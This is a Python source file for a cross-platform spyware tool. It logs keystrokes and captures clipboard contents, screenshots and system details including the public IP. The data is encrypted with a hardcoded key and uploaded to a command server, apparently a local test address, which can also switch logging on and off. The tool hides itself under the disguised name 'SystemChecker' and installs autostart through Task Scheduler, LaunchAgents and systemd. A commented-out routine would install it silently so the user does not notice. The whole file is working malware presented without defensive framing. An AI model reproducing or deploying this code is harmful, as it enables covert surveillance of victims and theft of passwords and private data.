import socket
import platform
import requests
import pyperclip
from pynput import keyboard
import time
import os
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab
from datetime import datetime, timedelta
import tempfile
import shutil
import sys
import subprocess
import getpass
import win32com.client

# Define base directory for file storage
base_dir = tempfile.gettempdir()
log_dir = os.path.join(base_dir, "logger_files")
os.makedirs(log_dir, exist_ok=True)

# Other constants
time_iteration = 60
number_of_iterations_end = 1000
encryption_key = "e9pEXagLCMvIiyeOqsSf456koc4nmlHNIk9P7b5_7RE="

# Global variables to control logging
is_logging = True
keylogger_active = True  # Control the keylogger separately
last_logged_time = time.time()
last_clipboard_data = None

machine_id = socket.gethostname()
fernet = Fernet(encryption_key)


def add_to_startup(script_path):
    system = platform.system()
    if system == "Windows":
        try:
            # Create Task Scheduler object
            scheduler = win32com.client.Dispatch("Schedule.Service")
            scheduler.Connect()

            # Create a new task definition
            rootFolder = scheduler.GetFolder("\\")
            taskDef = scheduler.NewTask(0)

            # Create a trigger that will fire at logon
            trigger = taskDef.Triggers.Create(1)  # 1 means trigger at logon
            trigger.Id = "AtLogonTriggerId"
            trigger.UserId = getpass.getuser()
            trigger.Enabled = True

            # Create the action
            action = taskDef.Actions.Create(0)  # 0 means execute
            action.Path = sys.executable  # Path to the Python executable
            action.Arguments = script_path

            # Set parameters
            taskDef.RegistrationInfo.Description = "Starts SystemChecker on logon"
            taskDef.Principal.UserId = getpass.getuser()
            taskDef.Principal.LogonType = 3  # Interactive logon
            taskDef.Principal.RunLevel = 1  # Highest run level

            # Register the task in the root folder
            rootFolder.RegisterTaskDefinition(
                "SystemChecker",
                taskDef,
                6,  # Task create or update
                None,
                None,
                3,  # Logon interactively
            )
            print("Successfully added to startup (Windows).")
        except Exception as e:
            print(f"Failed to add to startup (Windows): {e}")

    elif system == "Darwin":  # macOS
        plist_content = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.user.SystemChecker</string>
            <key>ProgramArguments</key>
            <array>
                <string>{sys.executable}</string>
                <string>{script_path}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """
        plist_path = os.path.join(os.path.expanduser('~'), "Library", "LaunchAgents", "com.user.SystemChecker.plist")
        try:
            with open(plist_path, 'w') as plist_file:
                plist_file.write(plist_content)
            os.system(f"launchctl load {plist_path}")
            print("Successfully added to startup (macOS).")
        except Exception as e:
            print(f"Failed to add to startup (macOS): {e}")

    elif system == "Linux":
        try:
            service_content = f"""
            [Unit]
            Description=SystemChecker Autostart

            [Service]
            ExecStart={sys.executable} {script_path}
            Restart=always
            User={getpass.getuser()}
            Environment=PYTHONUNBUFFERED=1

            [Install]
            WantedBy=multi-user.target
            """
            service_path = f"/etc/systemd/system/SystemChecker.service"
            with open(service_path, 'w') as service_file:
                service_file.write(service_content)
            os.system('systemctl enable SystemChecker.service')
            os.system('systemctl start SystemChecker.service')
            print("Successfully added to startup (Linux).")
        except Exception as e:
            print(f"Failed to add to startup (Linux): {e}")


def move_to_hidden_location():
    system = platform.system()

    if system == "Windows":
        hidden_dir = os.path.join(os.getenv('LOCALAPPDATA'), "SystemChecker")
        new_exe_path = os.path.join(hidden_dir, "SystemChecker.exe")
    else:
        hidden_dir = os.path.join(os.path.expanduser('~'), ".SystemChecker")
        new_exe_path = os.path.join(hidden_dir, "SystemChecker")

    # Ensure the directory exists
    os.makedirs(hidden_dir, exist_ok=True)

    # Get the current executable path
    current_exe_path = os.path.abspath(sys.argv[0])

    # Debugging information
    print(f"Current executable path: {current_exe_path}")
    print(f"New executable path: {new_exe_path}")

    if current_exe_path != new_exe_path:
        try:
            shutil.copy2(current_exe_path, new_exe_path)
            add_to_startup(new_exe_path)
            if system == "Windows":
                os.startfile(new_exe_path)
            else:
                subprocess.Popen([new_exe_path])
            sys.exit()
        except Exception as e:
            print(f"Failed to move the executable: {e}")
    else:
        add_to_startup(new_exe_path)
# def schedule_one_time_setup():
#     system = platform.system()
#
#     if system == "Windows":
#         try:
#             import win32com.client  # Import within the conditional
#
#             # Create Task Scheduler object
#             scheduler = win32com.client.Dispatch("Schedule.Service")
#             scheduler.Connect()
#             # Create a new task definition
#             rootFolder = scheduler.GetFolder("\\")
#             taskDef = scheduler.NewTask(0)
#             # Create a trigger that will fire at logon with future end date
#             trigger = taskDef.Triggers.Create(1)  # 1 means trigger at logon
#             trigger.Id = "OneTimeSetupTrigger"
#             trigger.UserId = getpass.getuser()
#             trigger.Enabled = True
#
#             # Remove this task after it runs once
#             trigger.Repetition.StopAtDurationEnd = True
#             trigger.EndBoundary = (datetime.now() + timedelta(days=1)).strftime(
#                 '%Y-%m-%dT%H:%M:%S')  # 24 hours from now
#
#             # Create the action
#             action = taskDef.Actions.Create(0)  # 0 means execute
#             action.Path = sys.executable  # Path to the Python executable
#             action.Arguments = f"{sys.argv[0]} silent"
#             # Set parameters
#             taskDef.RegistrationInfo.Description = "One-time setup for SystemChecker"
#             taskDef.Principal.UserId = getpass.getuser()
#             taskDef.Principal.LogonType = 3  # Interactive logon
#             taskDef.Principal.RunLevel = 1  # Highest run level
#             # Register the task in the root folder
#             rootFolder.RegisterTaskDefinition(
#                 "OneTimeSystemCheckerSetup",
#                 taskDef,
#                 6,  # Task create or update
#                 None,
#                 None,
#                 3,  # Logon interactively
#             )
#             print("Successfully scheduled one-time setup (Windows).")
#         except Exception as e:
#             print(f"Failed to schedule one-time setup (Windows): {e}")
#
#     elif system == "Darwin":  # macOS
#         plist_content = f"""
#         <?xml version="1.0" encoding="UTF-8"?>
#         <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
#         <plist version="1.0">
#         <dict>
#             <key>Label</key>
#             <string>com.user.OneTimeSystemCheckerSetup</string>
#             <key>ProgramArguments</key>
#             <array>
#                 <string>{sys.executable}</string>
#                 <string>{sys.argv[0]}</string>
#                 <string>silent</string>
#             </array>
#             <key>RunAtLoad</key>
#             <true/>
#         </dict>
#         </plist>
#         """
#         plist_path = os.path.join(os.path.expanduser('~'), "Library", "LaunchAgents",
#                                   "com.user.OneTimeSystemCheckerSetup.plist")
#         try:
#             with open(plist_path, 'w') as plist_file:
#                 plist_file.write(plist_content)
#             os.system(f"launchctl load {plist_path}")
#             print("Successfully scheduled one-time setup (macOS).")
#         except Exception as e:
#             print(f"Failed to schedule one-time setup (macOS): {e}")
#
#     elif system == "Linux":
#         try:
#             service_content = f"""
#             [Unit]
#             Description=One-time setup for SystemChecker
#             [Service]
#             ExecStart={sys.executable} {sys.argv[0]} silent
#             RemainAfterExit=yes
#             [Install]
#             WantedBy=multi-user.target
#             """
#             service_path = f"/etc/systemd/system/OneTimeSystemCheckerSetup.service"
#             with open(service_path, 'w') as service_file:
#                 service_file.write(service_content)
#             os.system('systemctl enable OneTimeSystemCheckerSetup.service')
#             os.system('systemctl start OneTimeSystemCheckerSetup.service')
#             print("Successfully scheduled one-time setup (Linux).")
#         except Exception as e:
#             print(f"Failed to schedule one-time setup (Linux): {e}")
#
#     else:
#         print(f"Unsupported system: {system}")

# if __name__ == "__main__":
#     if len(sys.argv) > 1 and sys.argv[1] == "silent":
#         move_to_hidden_location()
#     else:
#         # Schedule one-time task that runs this script with "silent" argument
#        # schedule_one_time_setup()
#
#         # Exit so the user doesn't notice
#         sys.exit()

def send_to_server(file_path, server_url, file_type, retain_file):
    try:
        # Check if the file exists and not empty
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            with open(file_path, 'rb') as f:
                response = requests.post(server_url, files={'file': f},
                                         data={'machine_id': machine_id, 'file_type': file_type})
            if not retain_file:
                os.remove(file_path)  # Safely delete after upload
            return response.text
        else:
            print(f"File {file_path} does not exist or is empty, not sending to server.")
    except Exception as e:
        print(f"Error uploading {file_path}: {e}")


# Encrypt and send keylogger data
try:
    keys_file = os.path.join(log_dir, f"key_log_{machine_id}.txt")
    if os.path.exists(keys_file) and os.path.getsize(keys_file) > 0:
        with open(keys_file, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        keys_file_encrypted = keys_file.replace("key_log", "e_key_log")
        with open(keys_file_encrypted, 'wb') as ef:
            ef.write(encrypted)
        response = send_to_server(
            keys_file_encrypted,
            "http://127.0.0.1:5001/upload",
            file_type='keylog',
            retain_file=False
        )
        print(f"Keylogger data sent: {response}")
except Exception as e:
    print(f"Error handling keylogger data: {e}")


def check_server_for_command():
    global is_logging, keylogger_active
    try:
        response = requests.get(f"http://127.0.0.1:5001/command/{machine_id}")
        command = response.json().get('current_command')
        if command == "STOP":
            is_logging = False
            keylogger_active = False
        elif command == "RUN":
            is_logging = True
            keylogger_active = True
    except Exception as e:
        print(f"Error contacting server: {e}")


def computer_information(system_info_file):
    try:
        with open(system_info_file, "w") as f:
            hostname = socket.gethostname()
            ip_addr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + '\n')
            except:
                f.write("Couldn't get Public IP Address\n")
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {ip_addr}\n")
            f.write(f"Username: {os.getenv('USERNAME')}\n")
    except Exception as e:
        print(f"Error gathering computer information: {e}")


def copy_clipboard(clipboard_file):
    global last_clipboard_data
    try:
        pasted_data = pyperclip.paste()

        if pasted_data != last_clipboard_data:
            with open(clipboard_file, "a") as f:
                f.write(f"\n[Clipboard Data at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]:\n{pasted_data}\n")
            last_clipboard_data = pasted_data
            print(f"Copied new clipboard data:\n{pasted_data}")
        else:
            print(f"Clipboard data unchanged.")
    except Exception as e:
        print(f"Error copying clipboard data: {e}")


def take_screenshot(screenshot_file):
    try:
        im = ImageGrab.grab()
        im.save(screenshot_file)
    except Exception as e:
        print(f"Error taking screenshot: {e}")


def keypressed(key):
    global last_logged_time
    keys_file = os.path.join(log_dir, f"key_log_{machine_id}.txt")

    try:
        if is_logging and keylogger_active:  # Check if logging and keylogger are enabled
            current_time = time.time()
            if current_time - last_logged_time >= 3600:  # Log timestamp if an hour has passed
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(keys_file, 'a') as f:
                    f.write(f"\n[{timestamp}] ")
                last_logged_time = current_time

            # Log keystrokes
            with open(keys_file, 'a') as f:
                try:
                    char = key.char
                    f.write(char)
                    print(f"Logged keystroke: {char}")
                except AttributeError:
                    if key == keyboard.Key.space:
                        f.write(' ')
                        print("Logged keystroke: [SPACE]")
                    elif key == keyboard.Key.enter:
                        f.write('\n')
                        print("Logged keystroke: [ENTER]")

            # Ensure file buffer is flushed to disk
            f.flush()
            os.fsync(f.fileno())

    except Exception as e:
        print(f"Error logging key presses: {e}")



listener = keyboard.Listener(on_press=keypressed)
listener.start()

current_time = time.time()
stopping_time = current_time + time_iteration
number_of_iterations = 0

while number_of_iterations < number_of_iterations_end:
    try:
        check_server_for_command()

        iteration_tag = f"iteration_{number_of_iterations}"
        system_data_file = os.path.join(log_dir, f"systeminfo_{machine_id}.txt")
        keys_file = os.path.join(log_dir, f"key_log_{machine_id}.txt")
        clipboard_file = os.path.join(log_dir, f"clipboard_{machine_id}.txt")
        screenshot_dir = os.path.join(log_dir, f"screenshots_{machine_id}")
        os.makedirs(screenshot_dir, exist_ok=True)
        screenshot_file = os.path.join(screenshot_dir, f"screenshot_{iteration_tag}.png")

        clipboard_file_encrypted = os.path.join(log_dir, f"e_clipboard_{machine_id}.txt")
        keys_file_encrypted = os.path.join(log_dir, f"e_key_log_{machine_id}.txt")
        system_file_encrypted = os.path.join(log_dir, f"e_systeminfo_{machine_id}.txt")

        # Controlled timed operation
        if time.time() > stopping_time:
            print(f"Iteration: {number_of_iterations}")

            if number_of_iterations == 0:
                computer_information(system_data_file)

            # Encrypt and send system information
            if os.path.exists(system_data_file) and os.path.getsize(system_data_file) > 0:
                try:
                    with open(system_data_file, 'rb') as f:
                        data = f.read()
                    encrypted = fernet.encrypt(data)
                    with open(system_file_encrypted, 'wb') as ef:
                        ef.write(encrypted)
                    response = send_to_server(
                        system_file_encrypted,
                        "http://127.0.0.1:5001/upload",
                        file_type='system',
                        retain_file=False
                    )
                    print(f"System info sent. Server response: {response}")
                except Exception as e:
                    print(f"Error encrypting or sending system information: {e}")

            # Take and send a screenshot
            try:
                take_screenshot(screenshot_file)
                response = send_to_server(
                    screenshot_file,
                    "http://127.0.0.1:5001/upload",
                    file_type='screenshot',
                    retain_file=False
                )
                print(f"Screenshot sent. Server response: {response}")
            except Exception as e:
                print(f"Error taking or sending screenshot: {e}")

            # Copy and send clipboard data
            try:
                copy_clipboard(clipboard_file)
                if os.path.exists(clipboard_file) and os.path.getsize(clipboard_file) > 0:
                    with open(clipboard_file, 'rb') as f:
                        data = f.read()
                    encrypted = fernet.encrypt(data)
                    with open(clipboard_file_encrypted, 'wb') as ef:
                        ef.write(encrypted)
                    response = send_to_server(
                        clipboard_file_encrypted,
                        "http://127.0.0.1:5001/upload",
                        file_type='clipboard',
                        retain_file=False
                    )
                    print(f"Clipboard data sent. Server response: {response}")
            except Exception as e:
                print(f"Error copying or sending clipboard data: {e}")

            # Encrypt and send the keylogger file
            try:
                keys_file = os.path.join(log_dir, f"key_log_{machine_id}.txt")
                if os.path.exists(keys_file) and os.path.getsize(keys_file) > 0:
                    with open(keys_file, 'rb') as f:
                        data = f.read()
                    encrypted = fernet.encrypt(data)
                    with open(keys_file_encrypted, 'wb') as ef:
                        ef.write(encrypted)
                    response = send_to_server(
                        keys_file_encrypted,
                        "http://127.0.0.1:5001/upload",
                        file_type='keylog',
                        retain_file=False
                    )
                    print(f"Key log info sent. Server response: {response}")
                    os.remove(keys_file)  # Remove after sending
            except Exception as e:
                print(f"Error encrypting or sending key log: {e}")

            # Update iteration timing and counter
            number_of_iterations += 1
            current_time = time.time()
            stopping_time = current_time + time_iteration

    except Exception as e:
        print(f"Error during iteration: {e}")

time.sleep(120)

